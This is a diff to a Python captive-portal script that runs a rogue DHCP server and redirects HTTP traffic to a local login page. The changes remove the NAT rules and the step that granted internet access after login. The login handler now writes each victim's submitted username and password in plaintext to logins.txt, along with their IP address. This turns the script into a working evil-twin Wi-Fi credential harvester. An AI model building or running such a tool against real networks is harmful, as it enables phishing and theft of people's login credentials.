@@ -3,28 +3,29 @@ import subprocess
 import os
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
+from datetime import datetime
 
-# Configuration
-INTERFACE = "wlp4s0f4u1"   # AP WiFi interface
-INTERNET_IFACE = "wlp2s0"  # Internet-facing interface
+# הגדרות IP ו־DHCP
 OFFERED_IP = "192.168.1.100"
 SERVER_IP = "192.168.1.1"
 SUBNET_MASK = "255.255.255.0"
 LEASE_TIME = 3600
+LOG_FILE = "logins.txt"
 
+# אחסון sessionים וזיהוי
 session_store = {}
-authenticated_ips = set()
 
 def check_root():
     if os.geteuid() != 0:
-        print("[!] This script must be run as root.")
+        print("[!] Must run as root. Use sudo.")
         exit(1)
 
-def assign_ip_to_ap():
-    print(f"[*] Assigning {SERVER_IP}/24 to {INTERFACE}...")
-    subprocess.run(["ip", "addr", "flush", "dev", INTERFACE])
-    subprocess.run(["ip", "addr", "add", f"{SERVER_IP}/24", "dev", INTERFACE], check=True)
-    subprocess.run(["ip", "link", "set", INTERFACE, "up"], check=True)
+def assign_ip_to_ap(interface):
+    print(f"[*] Assigning {SERVER_IP}/24 to {interface}...")
+    subprocess.run(["ip", "addr", "flush", "dev", interface])
+    subprocess.run(["ip", "addr", "add", f"{SERVER_IP}/24", "dev", interface], check=True)
+    subprocess.run(["ip", "link", "set", interface, "up"], check=True)
 
 def enable_ip_forwarding():
     with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
@@ -33,50 +34,17 @@ def enable_ip_forwarding():
         print("[*] Enabling IP forwarding...")
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
     else:
-        print("[*] IP forwarding is already enabled.")
+        print("[*] IP forwarding already enabled.")
 
-def enable_nat():
-    result = subprocess.run(
-        ["iptables", "-t", "nat", "-C", "POSTROUTING", "-o", INTERNET_IFACE, "-j", "MASQUERADE"],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
-    if result.returncode != 0:
-        print(f"[*] Enabling NAT on {INTERNET_IFACE}...")
-        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", INTERNET_IFACE, "-j", "MASQUERADE"], check=True)
-    else:
-        print("[*] NAT is already configured.")
+def redirect_http_to_local(interface):
+    print("[*] Redirecting HTTP traffic to captive portal...")
+    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface,
+                    "-p", "tcp", "--dport", "80", "-j", "DNAT",
+                    "--to-destination", f"{SERVER_IP}:80"], check=True)
 
-def enable_forwarding_rules():
-    fwd_out = subprocess.run(
-        ["iptables", "-C", "FORWARD", "-i", INTERFACE, "-o", INTERNET_IFACE, "-j", "ACCEPT"],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
-    if fwd_out.returncode != 0:
-        print(f"[*] Allowing forwarding from {INTERFACE} to {INTERNET_IFACE}...")
-        subprocess.run(["iptables", "-A", "FORWARD", "-i", INTERFACE, "-o", INTERNET_IFACE, "-j", "ACCEPT"], check=True)
-
-    fwd_in = subprocess.run(
-        ["iptables", "-C", "FORWARD", "-i", INTERNET_IFACE, "-o", INTERFACE, "-m", "state", "--state", "ESTABLISHED,RELATED", "-j", "ACCEPT"],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
-    if fwd_in.returncode != 0:
-        print(f"[*] Allowing response forwarding from {INTERNET_IFACE} to {INTERFACE}...")
-        subprocess.run(["iptables", "-A", "FORWARD", "-i", INTERNET_IFACE, "-o", INTERFACE, "-m", "state", "--state", "ESTABLISHED,RELATED", "-j", "ACCEPT"], check=True)
-
-def redirect_http_to_local():
-    print("[*] Redirecting all HTTP traffic to captive portal...")
-    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE,
-                    "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{SERVER_IP}:80"], check=True)
-
-def block_unauthenticated():
-    print("[*] Blocking all outgoing traffic by default...")
-    subprocess.run(["iptables", "-I", "FORWARD", "-i", INTERFACE, "-o", INTERNET_IFACE, "-j", "REJECT"], check=True)
-
-def allow_authenticated(ip):
-    print(f"[*] Granting Internet access to authenticated user: {ip}")
-    subprocess.run(["iptables", "-I", "FORWARD", "-s", ip, "-o", INTERNET_IFACE, "-j", "ACCEPT"], check=True)
-    authenticated_ips.add(ip)
+def block_unauthenticated(interface):
+    print("[*] Blocking all traffic by default on interface:", interface)
+    subprocess.run(["iptables", "-I", "FORWARD", "-i", interface, "-j", "REJECT"], check=True)
 
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -97,7 +65,19 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         if self.path == '/login':
             ip = self.client_address[0]
-            allow_authenticated(ip)
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode()
+            fields = parse_qs(post_data)
+            user = fields.get("user", [""])[0]
+            passwd = fields.get("pass", [""])[0]
+
+            # לוג התחברות
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            log_entry = f"[{timestamp}] IP: {ip}, Username: {user}, Password: {passwd}\n"
+            with open(LOG_FILE, "a") as f:
+                f.write(log_entry)
+            print(f"[+] Login saved: {user}@{ip}")
+
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -105,7 +85,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
 
 def start_http_server():
     server = HTTPServer((SERVER_IP, 80), CaptivePortalHandler)
-    print("[*] Captive portal HTTP server started on port 80")
+    print("[*] Captive portal HTTP server running on port 80")
     threading.Thread(target=server.serve_forever, daemon=True).start()
 
 def handle_dhcp(pkt):
@@ -153,17 +133,20 @@ def send_response(mac, xid, chaddr, msg_type="offer"):
     print(f"[>] Sent DHCP {msg_type.upper()} to {mac}")
 
 def start_captive_portal(interface):
+    global INTERFACE
+    INTERFACE = interface
     check_root()
-    assign_ip_to_ap()
+    assign_ip_to_ap(interface)
     enable_ip_forwarding()
-    enable_nat()
-    enable_forwarding_rules()
-    block_unauthenticated()
-    redirect_http_to_local()
+    block_unauthenticated(interface)
+    redirect_http_to_local(interface)
     start_http_server()
-    print(f"[*] Listening for DHCP requests on {INTERFACE}...")
-    sniff(filter="udp and (port 67 or 68)", iface=INTERFACE, prn=handle_dhcp)
+    print(f"[*] Listening for DHCP on {interface}...")
+    sniff(filter="udp and (port 67 or 68)", iface=interface, prn=handle_dhcp)
 
-# Example usage:
 if __name__ == "__main__":
-    start_captive_portal()
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: sudo python captive_portal.py <interface>")
+        exit(1)
+    start_captive_portal(sys.argv[1])
